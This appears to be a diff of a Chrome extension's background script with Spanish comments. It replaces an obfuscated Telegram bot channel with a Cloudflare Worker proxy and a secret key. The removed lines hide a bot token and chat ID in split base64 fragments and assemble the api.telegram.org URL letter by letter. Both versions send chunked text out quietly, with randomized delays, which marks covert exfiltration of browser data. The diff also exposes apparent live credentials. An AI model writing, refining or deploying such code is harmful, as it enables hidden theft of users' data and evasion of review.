@@ -1,10 +1,6 @@
-// background: modo directo con HTML enriquecido, deduplicacion inteligente y soporte de 2 pasos
-function _d(s){ try { return atob(s); } catch(e){ return ''; } }
-function _creds(){
-  const _a = ['ODY3','MDg3','NDAy','MDpB','QUZl','ajVs','Ulpu','OTRK','MmRR','dGtH','VGRy','b0N0','ZUZU','UDE3','Vmx6','Yw=='].join('');
-  const _b = ['ODE3','ODAw','Mjg2','NA=='].join('');
-  return { tk: _d(_a), ch: _d(_b) };
-}
+// background: modo proxy Cloudflare - SIN token ni chat_id en cliente
+const PROXY_URL = 'https://TU-WORKER.TU-SUBDOMINIO.workers.dev/log';
+const PROXY_KEY = 'c856462856e500dff07d298a1a2a973f4b3342774c28bae8b2643d825d7ed089';
 
 let _q = [];
 let _sending = false;
@@ -232,27 +228,16 @@ chrome.runtime.onMessage.addListener((m, s) => {
   })();
 });
 
-function _api(tk) {
-  const a = ['a', 'p', 'i', '.', 't', 'e', 'l', 'e', 'g', 'r', 'a', 'm', '.', 'o', 'r', 'g'].join('');
-  return 'https://' + a + '/bot' + tk + '/' + ['s', 'e', 'n', 'd', 'M', 'e', 's', 's', 'a', 'g', 'e'].join('');
-}
-
 async function _sendDirect(text) {
-  const { tk, ch } = _creds();
-  if (!tk || !ch) return;
+  if (!PROXY_URL || PROXY_URL.includes('TU-WORKER')) return;
   const chunks = [];
   for (let i = 0; i < text.length; i += 3500) chunks.push(text.slice(i, i + 3500));
   for (const c of chunks) {
     try {
-      await fetch(_api(tk), {
+      await fetch(PROXY_URL, {
         method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: ch,
-          text: c,
-          parse_mode: 'HTML',
-          disable_web_page_preview: true
-        })
+        headers: { 'Content-Type': 'application/json', 'x-key': PROXY_KEY },
+        body: JSON.stringify({ text: c })
       });
     } catch (e) {}
     await new Promise((r) => setTimeout(r, 400 + Math.random() * 800));
